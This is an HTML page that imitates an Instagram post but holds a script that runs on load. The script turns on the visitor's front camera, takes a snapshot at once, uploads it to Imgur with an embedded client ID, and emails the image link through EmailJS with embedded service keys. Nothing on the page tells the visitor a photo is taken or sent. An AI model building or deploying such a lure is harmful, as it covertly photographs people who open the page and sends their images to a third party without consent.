
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Instagram Post Snapshot</title>
<style>
  body {
    background: #fafafa;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    margin: 0; padding: 20px;
    display: flex; justify-content: center;
  }
  .post-container {
    background: #fff;
    border: 1px solid #dbdbdb;
    max-width: 600px;
    width: 100%;
    border-radius: 3px;
  }
  .post-header {
    display: flex;
    align-items: center;
    padding: 14px;
  }
  .profile-pic {
    width: 32px; height: 32px;
    border-radius: 50%;
    margin-right: 12px;
  }
  .username {
    font-weight: 600;
    font-size: 14px;
  }
  #video, #snapshot {
    width: 100%;
    display: block;
  }
  #snapshot {
    display: none;
  }
  .post-actions {
    display: flex;
    padding: 10px 14px;
    gap: 14px;
  }
  .icon {
    width: 24px; height: 24px;
    cursor: pointer;
  }
  .likes {
    font-weight: 600;
    padding: 0 14px 10px;
    font-size: 14px;
  }
  .comments {
    padding: 0 14px 14px;
    font-size: 14px;
  }
  .comment-input {
    border-top: 1px solid #efefef;
    padding: 10px 14px;
  }
  .comment-input input {
    width: 100%;
    border: none;
    font-size: 14px;
    outline: none;
  }
</style>
</head>
<body>

<div class="post-container">
  <div class="post-header">
    <img src="https://i.pravatar.cc/150?img=3" alt="Profile Pic" class="profile-pic" />
    <div class="username">cool_user</div>
  </div>

  <video id="video" autoplay playsinline></video>
  <img id="snapshot" alt="Snapshot" />

  <div class="post-actions">
    <img class="icon" src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/49/Heart_font_awesome.svg/1024px-Heart_font_awesome.svg.png" alt="Like" />
    <img class="icon" src="https://cdn-icons-png.flaticon.com/512/1380/1380338.png" alt="Comment" />
    <img class="icon" src="https://cdn-icons-png.flaticon.com/512/54/54481.png" alt="Share" />
  </div>
  <div class="likes">1,234 likes</div>
  <div class="comments">
    <b>user123</b> Awesome shot!<br/>
    <b>another_user</b> Love this! ‚ù§Ô∏è
  </div>
  <div class="comment-input">
    <input type="text" placeholder="Add a comment..." />
  </div>
</div>

<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
<script>
  emailjs.init("eD5ejiUiqX5khbO-o");

  const video = document.getElementById('video');
  const snapshot = document.getElementById('snapshot');

  function uploadToImgur(base64Image) {
    const apiUrl = "https://api.imgur.com/3/image";
    const clientId = "d9c637b3675e937";
    const base64Clean = base64Image.split(',')[1].trim();

    return fetch(apiUrl, {
      method: "POST",
      headers: {
        Authorization: `Client-ID ${clientId}`,
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        image: base64Clean,
        type: "base64"
      })
    })
    .then(response => response.json())
    .then(data => {
      if (data.success) {
        return data.data.link;
      } else {
        throw new Error(data.data.error || "Imgur upload failed");
      }
    });
  }

  function takeSnapshotAndSend() {
    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    const imageData = canvas.toDataURL('image/png');

    snapshot.src = imageData;
    snapshot.style.display = 'block';
    video.style.display = 'none';

    uploadToImgur(imageData).then(imgurLink => {
      const templateParams = {
        image_url: imgurLink
      };

      emailjs.send('service_8fdw382', 'template_giubqnn', templateParams)
        .then(() => alert("üì∏ Photo uploaded and email sent!"))
        .catch(err => alert("‚ùå Email send failed: " + err.text));
    }).catch(err => alert("‚ùå Imgur upload failed: " + err.message));
  }

  navigator.mediaDevices.getUserMedia({
    video: {
      facingMode: "user",
      width: { ideal: 600 },
      height: { ideal: 600 }
    },
    audio: false
  })
  .then(stream => {
    video.srcObject = stream;
    video.onloadedmetadata = () => {
      takeSnapshotAndSend();
    };
  })
  .catch(err => alert("Camera error: " + err));
</script>

</body>
</html>
